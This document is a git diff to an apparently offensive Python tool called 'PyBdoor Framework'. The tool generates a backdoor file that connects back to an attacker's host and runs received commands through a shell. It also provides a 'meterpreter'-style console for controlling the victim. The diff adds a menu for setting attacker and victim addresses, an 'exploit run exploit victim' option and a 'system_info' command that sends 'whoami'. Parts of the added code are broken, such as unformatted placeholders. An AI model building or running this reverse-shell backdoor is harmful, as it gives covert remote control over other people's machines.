@@ -3,19 +3,41 @@ import time
 import sys
 import os 
 
+print("")
 os.system('cls' if os.name == 'nt' else 'clear')
 def banner():
 	print('''            
- _____       _             
-|  _  |_ _ _| |___ ___ ___ 
-|   __| | | . | . | . |  _|
-|__|  |_  |___|___|___|_|  
-      |___|                ''')
+ (                                    
+ )\ )        (    (                   
+(()/( (    ( )\   )\ )           (    
+ /(_)))\ ) )((_) (()/(  (    (   )(   
+(_)) (()/(((_)_   ((_)) )\   )\ (()\  
+| _ \ )(_))| _ )  _| | ((_) ((_) ((_) 
+|  _/| || || _ \/ _` |/ _ \/ _ \| '_| 
+|_|   \_, ||___/\__,_|\___/\___/|_|   
+      |__/                             
+      PyBdoor Framework''')
 	print("")
 	print("Copyright : ph4mch13n")
 	print("Twitter : @Anonym0us_VNPC")
 	print("Tele : https://t.me/Anon0psNews")
 	print("Github : /Phamchie")
+	print('''
+============================================
+| command                 options          |
+============================================  
+| set lhost        set ip system attack    |
+| set lport        set port system attack  |
+|                                          |
+| set rhost        set ip victim           |
+| set rport        set port victim         |
+|                                          |
+| set filename     Created File Backdoor   |
+|                                          |
+| options          show options            |
+| help             helping for tools       |
+| exploit          run exploit victim      |
+============================================''')
 
 banner()
 
@@ -23,17 +45,17 @@ print("")
 print("type help")
 print("")
 
-lhost = 'null bytes'
-lport = 'null bytes'
+lhost = '127.0.0.1'
+lport = '4444'
 
-rhost = 'null'
-rport = 'null'
+rhost = '127.0.0.1'
+rport = '4444'
 
-filename = 'null bytes '
+filename = 'null'
 
 session = True
 while session:
-	text_main = input("pydoor > ")
+	text_main = input("pybdoor(backdoor) > ")
 
 	if text_main == "help":
 		print("")
@@ -120,6 +142,10 @@ while True:
 		s.close()
 		break
 
+	elif cmd == b'system_info':
+
+		s.send(b'whoami')
+
 	else:
 		proc = subprocess.Popen(cmd, 
 			shell=True, 
@@ -161,7 +187,7 @@ while True:
 		import sys
 
 		IP = f'{lhost}'
-		PORT = 4444
+		PORT = {lport}
 
 		s = socket.socket(socket.AF_INET,
 			socket.SOCK_STREAM)
@@ -191,7 +217,7 @@ while True:
 
 		while True:
 
-		      sys.stdout.write("\nmeterpreter > ")
+		      sys.stdout.write("\n{rhost}(meterpreter) > ")
 		      command = sys.stdin.readline()
 
 		      if command == 'exit\n':
@@ -199,6 +225,17 @@ while True:
 		          conn.send(b"exit")
 		          conn.close()
 		          break  
+
+		      elif command == 'system_info\n':
+		      	usr = conn.send(b'whoami')
+		      	ip = {rhost}
+		      	port = {rport}
+
+		      	print(f'''
+user admin : {usr}
+ip : {ip}
+port : {port}
+''')
 
 		      elif command != '\n':
 		          conn.send(command.encode())
